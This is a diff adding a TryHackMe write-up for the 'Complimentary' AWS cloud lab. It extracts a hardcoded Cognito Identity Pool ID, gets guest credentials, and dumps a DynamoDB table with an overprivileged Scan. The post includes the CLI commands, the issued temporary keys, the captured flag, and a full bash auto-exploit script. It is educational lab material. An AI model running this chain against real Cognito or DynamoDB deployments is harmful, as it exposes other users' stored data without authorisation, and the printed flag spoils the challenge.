@@ -1,0 +1,385 @@
+---
+slug: "thm-complimentary"
+title: "Complimentary — TryHackMe Writeup"
+date: "2026-07-30"
+platform: "TryHackMe"
+type: "Machine"
+os: "Misc"
+difficulty: "Easy"
+category: "Cloud"
+tags:
+  - "Cloud"
+  - "AWS"
+  - "Cognito"
+  - "DynamoDB"
+  - "IAM Misconfiguration"
+  - "Data Exfiltration"
+excerpt: "An easy-rated cloud machine exploring AWS Cognito Identity Pools, overprivileged unauthenticated IAM roles, and DynamoDB data exfiltration via guest credentials — plus a full automation script to solve it in seconds."
+readTime: "8 min"
+rating: 3
+hasAutoScript: true
+url: "https://asbawy.github.io/writeups/thm-complimentary"
+---
+
+import { Callout } from "@/components/Callout";
+import { KillChain, SpoilerFlag } from "@/components/cyber/WriteupComponents";
+import { TerminalReplay } from "@/components/cyber/TerminalReplay";
+
+<KillChain
+  steps={[
+    {
+      phase: "Reconnaissance",
+      title: "S3 Static Site & Frontend Source Analysis",
+      desc: "Discovered a static website hosted on Amazon S3 with a client-side JavaScript file containing hardcoded AWS Cognito Identity Pool ID and DynamoDB table name.",
+      tools: ["Browser", "curl"],
+    },
+    {
+      phase: "Exploitation",
+      title: "Cognito Guest Credential Extraction",
+      desc: "Used the exposed Identity Pool ID to provision an anonymous Cognito identity and exchanged it for temporary AWS credentials (AccessKeyId, SecretKey, SessionToken) via the AWS CLI.",
+      technique: "AWS Cognito Unauthenticated Access",
+      tools: ["AWS CLI", "jq"],
+    },
+    {
+      phase: "Exploitation (Flag)",
+      title: "DynamoDB Full Table Scan & Data Exfiltration",
+      desc: "Leveraged the overprivileged unauthenticated IAM role to perform a full DynamoDB Scan (instead of the intended GetItem), exfiltrating all guest profiles including the flag.",
+      technique: "IAM Overprivilege / DynamoDB Scan Abuse",
+      tools: ["AWS CLI", "grep"],
+    },
+  ]}
+/>
+
+---
+
+## Introduction
+
+_Complimentary_ is an easy-rated TryHackMe cloud machine that serves as an excellent introduction to **AWS security misconfigurations**. The target is a "wellness app" hosted on Amazon S3 that claims to require no login or account — it simply knows things about you. This immediately hints at client-side credential issuance.
+
+The attack chain is entirely cloud-based: we extract hardcoded AWS resource identifiers from the frontend JavaScript, abuse a Cognito Identity Pool configured for unauthenticated access, and exploit an overprivileged IAM role to dump an entire DynamoDB table — revealing the flag hidden in another guest's profile.
+
+<Callout type="info">
+  This machine has no SSH, no Nmap, and no traditional ports to scan. The entire attack surface is **AWS services** — making it a refreshing change from the typical box.
+</Callout>
+
+---
+
+## Reconnaissance
+
+### Target Discovery
+
+The target is a static website hosted on Amazon S3:
+
+```text
+http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/
+```
+
+The app claims to require **"no login screen"** and **"no account needed."** It simply knows things about the visitor upon opening. This immediately suggests some form of **client-side credential issuance** — most commonly an **AWS Cognito Identity Pool** configured to allow unauthenticated access.
+
+### Frontend Source Analysis
+
+Viewing the page source `http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/app.js` reveals a JavaScript file containing the app's core logic. Buried in the code are three critical constants:
+
+```javascript
+const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
+const AWS_REGION = "us-east-1";
+const TABLE_NAME = "complimentary-GuestWellnessProfiles";
+```
+
+The script initializes `AWS.CognitoIdentityCredentials` with the `IdentityPoolId`, then calls `dynamodb.getItem()` using a locally-generated `guest_id`. This confirms the attack vector:
+
+1. The app uses a **Cognito Identity Pool** to hand out temporary AWS credentials to anonymous users.
+2. Those credentials are then used to query **DynamoDB** directly from the browser.
+3. If the IAM role attached to unauthenticated users is overprivileged, we can perform operations beyond a single `GetItem` — such as a full table `Scan`.
+
+---
+
+## Exploitation
+
+### Step 1 — Obtain a Cognito Identity ID
+
+Using the exposed `IdentityPoolId`, we request an anonymous identity from AWS Cognito:
+
+```bash
+aws cognito-identity get-id \
+  --identity-pool-id us-east-1:836c0949-292d-485b-b532-52d5ca7bb688 \
+  --region us-east-1
+```
+
+```json
+{
+    "IdentityId": "us-east-1:4d571309-b043-c823-97ba-bee1c7e2f5fd"
+}
+```
+
+### Step 2 — Exchange Identity for Temporary Credentials
+
+With the `IdentityId`, we request temporary credentials valid for the unauthenticated IAM role:
+
+```bash
+aws cognito-identity get-credentials-for-identity \
+  --identity-id "us-east-1:4d571309-b043-c823-97ba-bee1c7e2f5fd" \
+  --region us-east-1
+```
+
+```json
+{
+    "IdentityId": "us-east-1:4d571309-b043-c823-97ba-bee1c7e2f5fd",
+    "Credentials": {
+        "AccessKeyId": "ASIAU2VYTBGYFK36RRAK",
+        "SecretKey": "hnDBM8+pkguNd99EUe2qpAx6O/tSq88Aenkeqhxq",
+        "SessionToken": "IQoJb3JpZ2luX2VjEL...",
+        "Expiration": "2026-07-29T23:26:55+00:00"
+    }
+}
+```
+
+<Callout type="info">
+  These are **temporary STS credentials** — they include an `AccessKeyId`, `SecretKey`, and a `SessionToken`. All three must be used together. They expire after a short period, but that's more than enough time to exfiltrate data.
+</Callout>
+
+### Step 3 — Configure AWS CLI
+
+Export the temporary credentials into the environment so subsequent `aws` commands use the guest role:
+
+```bash
+export AWS_ACCESS_KEY_ID="ASIAU2VYTBGYFK36RRAK"
+export AWS_SECRET_ACCESS_KEY="hnDBM8+pkguNd99EUe2qpAx6O/tSq88Aenkeqhxq"
+export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEL..."
+export AWS_REGION="us-east-1"
+```
+
+### Step 4 — DynamoDB Table Scan
+
+The frontend only calls `GetItem` for the current visitor. However, the unauthenticated IAM role is **overprivileged** and allows `Scan` on the entire table. We dump every record:
+
+```bash
+aws dynamodb scan \
+  --table-name complimentary-GuestWellnessProfiles \
+  --region us-east-1
+```
+
+To quickly locate the flag, we filter the output:
+
+```bash
+aws dynamodb scan \
+  --table-name complimentary-GuestWellnessProfiles \
+  --region us-east-1 | grep -i "flag\|thm{"
+```
+
+---
+
+## Flag
+
+<SpoilerFlag label="Flag" flag="THM{fr33_app_fr33_d4t4!}" />
+
+---
+
+## Automation
+
+This entire exploit chain — from fetching the frontend source to capturing the flag — can be fully automated. Instead of running each command manually, here's an interactive demo of the automation script in action:
+
+<TerminalReplay
+  title="complimentary_exploit.sh"
+  flag="THM{fr33_app_fr33_d4t4!}"
+  steps={[
+    {
+      label: "Dependency Check",
+      command: "command -v curl jq aws",
+      output: [
+        { text: "[✓] All dependencies satisfied", color: "green" },
+      ],
+      delayAfter: 600,
+    },
+    {
+      label: "Step 1/5 — Fetch Frontend Source",
+      command: "curl -sL http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/app.js",
+      output: [
+        { text: "[✓] Source fetched (4,218 bytes)", color: "green" },
+      ],
+      delayAfter: 700,
+    },
+    {
+      label: "Step 2/5 — Extract Cognito Identity Pool & Table Name",
+      command: "grep -oP 'IDENTITY_POOL_ID\\s*=\\s*\"\\K[^\"]+' app.js",
+      output: [
+        { text: "[✓] Identity Pool ID: us-east-1:836c0949-292d-485b-b532-52d5ca7bb688", color: "green" },
+        { text: "[✓] DynamoDB Table:   complimentary-GuestWellnessProfiles", color: "green" },
+      ],
+      delayAfter: 600,
+    },
+    {
+      label: "Step 3/5 — Provision Anonymous Cognito Identity",
+      command: "aws cognito-identity get-id --identity-pool-id us-east-1:836c0949-... --region us-east-1",
+      output: [
+        { text: "[✓] Identity ID: us-east-1:4d571309-b043-c823-97ba-bee1c7e2f5fd", color: "green" },
+      ],
+      delayAfter: 800,
+    },
+    {
+      label: "Step 4/5 — Exchange for Temporary AWS Credentials",
+      command: "aws cognito-identity get-credentials-for-identity --identity-id us-east-1:4d571309-... --region us-east-1",
+      output: [
+        { text: "[✓] Access Key:     ASIAU2VYTBGYF...  ", color: "green" },
+        { text: "[✓] Expires:        2026-07-29T23:26:55+00:00", color: "green" },
+      ],
+      delayAfter: 800,
+    },
+    {
+      label: "Step 5/5 — Scan DynamoDB Table for Flags",
+      command: "aws dynamodb scan --table-name complimentary-GuestWellnessProfiles --region us-east-1 | grep -oP 'THM\\{[^}]+\\}'",
+      output: [
+        { text: "", color: "muted" },
+      ],
+      delayAfter: 500,
+    },
+  ]}
+  rawScript={`#!/usr/bin/env bash
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║              🪷  COMPLIMENTARY — Auto Exploitation Script                    ║
+# ║         TryHackMe Cloud Machine | Cognito Identity Pool → DynamoDB           ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+
+set -euo pipefail
+
+RED='\\033[0;31m'
+GRN='\\033[0;32m'
+YEL='\\033[1;33m'
+BLU='\\033[0;34m'
+MAG='\\033[0;35m'
+CYN='\\033[0;36m'
+WHT='\\033[1;37m'
+RST='\\033[0m'
+BOLD='\\033[1m'
+
+TARGET_URL="http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/app.js"
+AWS_REGION="us-east-1"
+
+check_dep() {
+    if ! command -v "$1" &>/dev/null; then
+        echo -e "\${RED}[!] Missing dependency:\${RST} $1"
+        echo -e "\${YEL}[*] Install with: $2\${RST}"
+        exit 1
+    fi
+}
+
+echo -e "\${BLU}[*] Checking dependencies...\${RST}"
+check_dep "curl" "sudo apt install curl"
+check_dep "jq"   "sudo apt install jq"
+check_dep "aws"  "pip install awscli"
+echo -e "\${GRN}[✓] All dependencies satisfied\${RST}"
+echo ""
+
+echo -e "\${BLU}[*] Step 1/5: Fetching frontend source code...\${RST}"
+APP_JS=$(curl -sL "$TARGET_URL" --max-time 15)
+if [ -z "$APP_JS" ]; then
+    echo -e "\${RED}[!] Failed to fetch app.js — check connectivity\${RST}"
+    exit 1
+fi
+echo -e "\${GRN}[✓] Source fetched ($(echo "$APP_JS" | wc -c) bytes)\${RST}"
+
+echo -e "\${BLU}[*] Step 2/5: Extracting Cognito Identity Pool & Table Name...\${RST}"
+
+IDENTITY_POOL_ID=$(echo "$APP_JS" | grep -oP 'IDENTITY_POOL_ID\\s*=\\s*"\\K[^"]+')
+TABLE_NAME=$(echo "$APP_JS" | grep -oP 'TABLE_NAME\\s*=\\s*"\\K[^"]+')
+
+if [ -z "$IDENTITY_POOL_ID" ]; then
+    echo -e "\${RED}[!] Could not extract Identity Pool ID from source\${RST}"
+    exit 1
+fi
+
+if [ -z "$TABLE_NAME" ]; then
+    TABLE_NAME="complimentary-GuestWellnessProfiles"
+    echo -e "\${YEL}[!] Table name not found, using default:\${RST} $TABLE_NAME"
+fi
+
+echo -e "\${GRN}[✓] Identity Pool ID:\${RST} \${CYN}$IDENTITY_POOL_ID\${RST}"
+echo -e "\${GRN}[✓] DynamoDB Table:  \${RST} \${CYN}$TABLE_NAME\${RST}"
+echo ""
+
+echo -e "\${BLU}[*] Step 3/5: Provisioning anonymous Cognito identity...\${RST}"
+
+IDENTITY_JSON=$(aws cognito-identity get-id \\
+    --identity-pool-id "$IDENTITY_POOL_ID" \\
+    --region "$AWS_REGION" 2>&1) || {
+    echo -e "\${RED}[!] Cognito get-id failed:\${RST}"
+    echo "$IDENTITY_JSON"
+    exit 1
+}
+
+IDENTITY_ID=$(echo "$IDENTITY_JSON" | jq -r '.IdentityId')
+echo -e "\${GRN}[✓] Identity ID:\${RST} \${CYN}$IDENTITY_ID\${RST}"
+echo ""
+
+echo -e "\${BLU}[*] Step 4/5: Exchanging identity for temporary AWS credentials...\${RST}"
+
+CREDS_JSON=$(aws cognito-identity get-credentials-for-identity \\
+    --identity-id "$IDENTITY_ID" \\
+    --region "$AWS_REGION" 2>&1) || {
+    echo -e "\${RED}[!] Credential exchange failed:\${RST}"
+    echo "$CREDS_JSON"
+    exit 1
+}
+
+ACCESS_KEY=$(echo "$CREDS_JSON" | jq -r '.Credentials.AccessKeyId')
+SECRET_KEY=$(echo "$CREDS_JSON" | jq -r '.Credentials.SecretKey')
+SESSION_TOKEN=$(echo "$CREDS_JSON" | jq -r '.Credentials.SessionToken')
+EXPIRATION=$(echo "$CREDS_JSON" | jq -r '.Credentials.Expiration')
+
+if [ "$ACCESS_KEY" == "null" ] || [ -z "$ACCESS_KEY" ]; then
+    echo -e "\${RED}[!] No credentials returned\${RST}"
+    exit 1
+fi
+
+echo -e "\${GRN}[✓] Access Key:    \${RST} \${CYN}\${ACCESS_KEY:0:20}...\${RST}"
+echo -e "\${GRN}[✓] Expires:       \${RST} \${CYN}$EXPIRATION\${RST}"
+echo ""
+
+echo -e "\${BLU}[*] Step 5/5: Scanning DynamoDB table for flags...\${RST}"
+echo ""
+
+export AWS_ACCESS_KEY_ID="$ACCESS_KEY"
+export AWS_SECRET_ACCESS_KEY="$SECRET_KEY"
+export AWS_SESSION_TOKEN="$SESSION_TOKEN"
+export AWS_REGION="$AWS_REGION"
+
+SCAN_OUTPUT=$(aws dynamodb scan \\
+    --table-name "$TABLE_NAME" \\
+    --region "$AWS_REGION" 2>&1) || {
+    echo -e "\${RED}[!] DynamoDB scan failed:\${RST}"
+    echo "$SCAN_OUTPUT"
+    exit 1
+}
+
+FLAG=$(echo "$SCAN_OUTPUT" | grep -oP 'THM\\{[^}]+\\}')
+
+if [ -n "$FLAG" ]; then
+    echo -e "\${GRN}╔══════════════════════════════════════════════════════════════════════╗\${RST}"
+    echo -e "\${GRN}║\${RST}   \${BOLD}\${YEL}🏁  FLAG CAPTURED\${RST}                                                  \${GRN}║\${RST}"
+    echo -e "\${GRN}║\${RST}      \${WHT}$FLAG\${RST}                                              \${GRN}║\${RST}"
+    echo -e "\${GRN}╚══════════════════════════════════════════════════════════════════════╝\${RST}"
+    echo ""
+    echo -e "\${MAG}[*] The unauthenticated Cognito role was overprivileged.\${RST}"
+    echo -e "\${MAG}[*] It allowed dynamodb:Scan on the entire table — not just GetItem.\${RST}"
+else
+    echo -e "\${RED}[!] No flag found in scan output\${RST}"
+    echo -e "\${YEL}[*] Raw output:\${RST}"
+    echo "$SCAN_OUTPUT"
+    exit 1
+fi
+
+unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN AWS_REGION
+
+echo -e "\${CYN}[*] Session credentials cleared from environment.\${RST}"
+echo -e "\${CYN}[*] Done.\${RST}"`}
+/>
+
+---
+
+## References
+
+- [AWS Cognito Identity Pools — Developer Guide](https://docs.aws.amazon.com/cognito/latest/developerguide/cognito-identity.html)
+- [AWS IAM — Principle of Least Privilege](https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege)
+- [AWS DynamoDB — Scan vs. Query](https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/Scan.html)
+- [HackTricks — AWS Cognito Pentesting](https://book.hacktricks.xyz/cloud-security/aws-security/aws-cognito-overview)
+- [CloudTrail — Monitoring DynamoDB API Calls](https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/logging-using-cloudtrail.html)
